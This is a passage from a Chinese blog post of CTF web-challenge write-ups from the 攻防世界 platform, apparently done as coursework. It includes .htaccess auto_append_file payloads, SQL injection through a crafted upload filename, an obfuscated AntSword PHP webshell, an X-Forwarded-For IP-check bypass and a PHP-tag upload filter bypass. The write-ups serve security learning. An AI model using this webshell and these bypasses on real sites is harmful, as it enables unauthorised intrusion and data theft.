class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">master</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_open</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/(.*)\/(.*)$/s&#x27;</span>,<span class="variable">$path</span>,<span class="variable">$array</span>,<span class="number">0</span>,<span class="number">9</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$array</span>[<span class="number">1</span>];</span><br><span class="line">        parse_str(<span class="variable">$array</span>[<span class="number">2</span>],<span class="variable">$array</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path=<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name=<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;upload(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$a</span>===<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;search(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^uploads\/[a-z]&#123;10&#125;\/$/is&#x27;</span>,<span class="variable">$path</span>)||<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="variable">$file</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">         </span><br><span class="line">        <span class="variable">$file</span>=str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=str_replace(urldecode(<span class="string">&#x27;%03&#x27;</span>),<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=str_replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file:|http|pre|etc/is&#x27;</span>,<span class="variable">$file</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;illegalbbbbbb!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        file_put_contents(<span class="variable">$path</span>.<span class="variable">$filename</span>,<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$path</span>.<span class="string">&#x27;user.jpg&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload success!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="variable">$path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;illegal!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$files</span>=scandir(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$files as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(str_ireplace(<span class="variable">$name</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$v</span>)!==<span class="variable">$v</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$v</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_eof</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_stat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;phar&#x27;</span>);</span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">stream_wrapper_register(<span class="string">&#x27;master&#x27;</span>,<span class="string">&#x27;master&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中，<code>parse_str()</code> 函数把查询字符串解析到变量<code>array</code>中，<code>stream_open()</code>函数对<code>path</code>的传参和<code>name</code>的传参从字符串对应到变量，<code>upload()</code>函数过滤了上传文件的内容，包括<code>/file:\|http\|pre\|etc/is</code>以及<code>\&lt;&quot; ’.</code>均被过滤，<code>search()</code>函数判断是否存在和<code>name</code>相同的文件或者目录，并替换为空并列出当前目录。</p>
<p>在头像上传页面发现疑似文件上传漏洞，但尝试上传后提示等级太低，无法上传。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/602f51299652793045bc0d8c67ac9a5c.png"></p>
<p>注册十个账户，并填写推荐人后获得积分100，此时可以进行文件上传。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/017ff5dd11dab77b51566d73744f5fa3.png"></p>
<p>尝试上传图片马，上传成功但无法执行，怀疑触发了关键词过滤，在已上传目录里打开后，如上文代码审计的结论，<code>/file:\|http\|pre\|etc/is</code>以及&lt;“ ’.果然被过滤了，于是想到尝试上传.htaccess文件修改配置文件。构造第一个payload搜索flag文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file master:<span class="comment">//search/path=%2fhome%2f&amp;name=flag</span></span><br></pre></td></tr></table></figure>

<p>其中<code>%2f</code>是为了绕过’<code>/</code>’的正则匹配法则。</p>
<p>上传.htaccess文件后已经可以正常上传.php文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/40ab785485498af9a2ba7c46ecfdfbaf.png"></p>
<p> 访问1.php即可得到flag文件名：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/fce008b44f6d51502954d6c593fcae97.png"></p>
<p>然后再上传一个.htaccess文件，内容为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file /home/hiahiahia_flag</span><br></pre></td></tr></table></figure>

<p>此时再访问之前的1.php内容已变为：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/0fa649675dc50497bf7130c94cc97324.png"></p>
<p>得到flag。</p>
<h2 id="filemanager-（难度：8-10）"><a href="#filemanager-（难度：8-10）" class="headerlink" title="filemanager （难度：8/10）"></a>filemanager （难度：8/10）</h2><p>首先使用御剑专业版扫描：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/eb880eb3071a4c07664d58962095859c.png"></p>
<p>打开第一个，发现源代码泄露，进行代码审计：</p>
<p>发现后端代码使用了白名单，所以无法直接上传木马，同时该版本也不能使用<code>%00</code>截断，但发现网站有rename功能，观察rename.php的代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/659d5215596d2b447627c9f3501f17b3.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$result </span>= <span class="variable">$db</span>-&gt;query(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$result </span>= <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = basename(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$re </span>= <span class="variable">$db</span>-&gt;query(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$oldname </span>= UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="variable">$newname </span>= UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$oldname</span>)) &#123;</span><br><span class="line">            rename(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url </span>= <span class="string">&quot;/&quot;</span> . <span class="variable">$newname</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>怀疑可以通过前端功能rename进行sql注入，使其extension值为空：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/59d4725d744f8f2d8367cf42dfe89972.png"></p>
<p>然后修改文件添加.php后缀，使网站可以执行恶意代码。</p>
<p>首先上传一个名为<code>&#39;,extension=&#39;.txt</code>的txt文件用来sql注入，然后修改文件名为attack.txt：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/87ca205ac372b908b6414ff07eae00f6.png"></p>
<p>这样，新的文件名就变成了attack.txt.txt，经过上面高亮的数据库update语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update `file` <span class="keyword">set</span> `filename`<span class="operator">=</span><span class="string">&#x27;attack.txt&#x27;</span>, `oldname`<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,extension<span class="operator">=</span>’’ <span class="keyword">where</span> `fid`<span class="operator">=</span>&#123;$<span class="keyword">result</span>[<span class="string">&#x27;fid&#x27;</span>]&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>attack.txt的extension就变为空。于是我们再上传一个文件名相同的木马文件，利用Antsword插件生成木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$lVeL</span>=create_function(chr(<span class="number">15876</span>/<span class="number">441</span>).base64_decode(<span class="string">&#x27;cw==&#x27;</span>).chr(<span class="number">894</span>-<span class="number">783</span>).str_rot13(<span class="string">&#x27;z&#x27;</span>).str_rot13(<span class="string">&#x27;r&#x27;</span>),chr(<span class="number">01223</span>-<span class="number">01056</span>).chr(<span class="number">0104160</span>/<span class="number">0450</span>).str_rot13(<span class="string">&#x27;n&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).base64_decode(<span class="string">&#x27;KA==&#x27;</span>).str_rot13(<span class="string">&#x27;$&#x27;</span>).chr(<span class="number">0107147</span>/<span class="number">0475</span>).chr(<span class="number">31302</span>/<span class="number">282</span>).chr(<span class="number">0x2ef</span>-<span class="number">0x282</span>).chr(<span class="number">471</span>-<span class="number">370</span>).chr(<span class="number">01237</span>-<span class="number">01166</span>).chr(<span class="number">55932</span>/<span class="number">948</span>));<span class="variable">$lVeL</span>(base64_decode(<span class="string">&#x27;NDU3O&#x27;</span>.<span class="string">&#x27;DI2O0&#x27;</span>.<span class="string">&#x27;BldkF&#x27;</span>.<span class="string">&#x27;sKCRf&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">528</span>-<span class="number">443</span>).chr(<span class="number">58581</span>/<span class="number">849</span>).base64_decode(<span class="string">&#x27;OQ==&#x27;</span>).base64_decode(<span class="string">&#x27;VA==&#x27;</span>).base64_decode(<span class="string">&#x27;Vg==&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">0533</span>-<span class="number">0425</span>).base64_decode(<span class="string">&#x27;dA==&#x27;</span>).str_rot13(<span class="string">&#x27;w&#x27;</span>).chr(<span class="number">55500</span>/<span class="number">555</span>).str_rot13(<span class="string">&#x27;J&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;10XSk&#x27;</span>.<span class="string">&#x27;7MTM3&#x27;</span>.<span class="string">&#x27;MzQ3O&#x27;</span>.<span class="string">&#x27;Ds=&#x27;</span>.<span class="string">&#x27;&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传后由于<code>\$result[“extension”]</code>已经通过注入变为空，因此我们可以修改为.php文件。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/fc4be299b9b03fd1881a80e2d8290bed.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/81828d2b0adce03312bad2d98886eb75.png"></p>
<p>使用Antsword连接可以拿到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/e1453df898e4722d88020a7bd249c304.png"></p>
<p>也可以在虚拟终端内得到flag：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/8e36f0ea7b1de9c3bf56f9f5eae721ba.png"></p>
<h2 id="ics-04-（难度4-10）"><a href="#ics-04-（难度4-10）" class="headerlink" title="ics-04 （难度4/10）"></a>ics-04 （难度4/10）</h2><p>进入登录页面后发现三个入口可能存在sql注入漏洞：登录、注册和忘记密码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/fff877e45ab9d177e18a60d14527e149.png"></p>
<p>于是首先用sqlmap扫描登录页面，发现不存在sql注入：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/f18b5dfa2d26c186405ec978905431d6.png"></p>
<p>同样，注册页面也不存在sql注入，但在忘记密码页面，成功扫描出4个数据库：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/d715210161ac3cbb312864bea312da63.png"></p>
<p>因为该网站名为cetc，所以首先尝试访问该数据库。访问后发现只有一个user表，于是直接dump。之后发现密码已经加密，sqlmap的hash破解没有作用（后两个用户是我自己注册的），但我们得到了管理员用户名<code>c3tlwDmIn23</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/4f810777cb8e49cb6e63978ce139b27f.png"></p>
<p>后来尝试后发现该网站用户访问控制系统存在逻辑漏洞，可以重复注册同一个用户名，于是我们直接注册<code>c3tlwDmIn23</code>，便可以得到管理员权限。</p>
<p>注册后成功登录，便得到flag：<code>cyberpeace&#123;7de7a525272f7a3463d04739e971fc9b&#125;</code>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/f931eb8fccbd887628c1de4b24e06195.png"></p>
<h2 id="bug-（难度：5-10）"><a href="#bug-（难度：5-10）" class="headerlink" title="bug （难度：5/10）"></a>bug （难度：5/10）</h2><p>首先尝试注册admin账户，发现账号已存在。于是先注册一个test账号：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/0a87565bab6dad4d36f218c2782a9545.png"></p>
<p>但普通账号进入后无法打开manage选项卡，于是尝试寻找修改密码模块的逻辑漏洞。尝试Findpwd，然后用Burp Suite抓包，发现有username的信息，修改为admin：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/9d2f94bcd4f25358152322c0e256cd55.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/b6a30b8f82edc53f2579e6ddda92c795.png">提示修改成功：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/8e6d64ae0dea0aa890fbd6d0a2be3072.png"></p>
<p>成功进入admin账户，但在进入manage界面时提示IP不允许，只需要抓包然后加上<code>X-Forwarded-For: 127.0.0.1</code>即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/d7d300fa8f0c50d4bb20c3859e47d4a6.png"></p>
<p>进入之后打卡检查元素，发现页面注释有提示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/9e575230738b3c495d081f99b5a404a3.png"></p>
<p>如果直接访问这个网址会提示Action is not correct！只需要把???改成upload即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1366fb99b6041c8d547fa144d924fd87.png"></p>
<p>如果直接上传php文件的话会报错，如果直接修改MIME也不行，因为会检查文件内的<code>&lt;php&gt;</code>标签。这里需要用script模式绕过，上传一个内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;helloworld_php_script&lt;/script&gt;  </span><br></pre></td></tr></table></figure>

<p>的jpg文件，然后用Burp Suite 抓包：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/ed37f367c815522cc62e05edf4b2deef.png">Send后得到flag：<code>cyberpeace&#123;e788ce13e8255b0068e72bcf476453ec&#125;</code>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/78da8241a87b9d1ce7fa2cee3fa713ec.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Capcomin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zxy.link/posts/7eaecac2/">https://zxy.link/posts/7eaecac2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zxy.link" target="_blank">Capcomin's Space</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/">课程作业</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a></div><div class="post_share"><div class="social-share" data-image="/img/BEC1AFA5887CA3CF9B67BAAD53F20251.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/2f9013ea/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/java.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Java语言及网络编程作业</div></div></a></div><div class="next-post pull-right"><a href="/posts/dae2f53a/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/ctf_coding-1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CUMTCTF-2021秋季赛部分题解</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/16b653c4/" title="攻防世界Web题目WP（二）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cyberlock.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-03</div><div class="title">攻防世界Web题目WP（二）</div></div></a></div><div><a href="/posts/dae2f53a/" 